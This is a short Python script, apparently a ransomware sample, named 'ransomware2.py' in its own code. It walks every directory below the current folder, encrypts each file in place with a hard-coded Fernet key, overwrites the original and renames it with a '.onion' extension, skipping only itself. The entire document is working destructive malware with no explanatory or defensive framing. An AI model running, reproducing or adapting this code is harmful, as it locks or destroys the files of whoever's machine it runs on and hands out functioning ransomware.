from cryptography.fernet import Fernet
import os 

key ="lAi0w6E7sGfoE95PmF4IBy9h4McB--tL0_XdbjIsnYs="
f = Fernet(key)

def encrypt(filename, key):
    with open(filename, "rb") as file:
        file_data = file.read()

    encrypted_data = f.encrypt(file_data)

    with open(filename, "wb") as file:
        file.write(encrypted_data)

    os.rename(filename, filename + '.onion')

for path, subdirs, files in os.walk("./"):
    for name in files:
        filename = os.path.join(path, name)
        if filename == "./ransomware2.py":
            continue
        encrypt(filename,key)    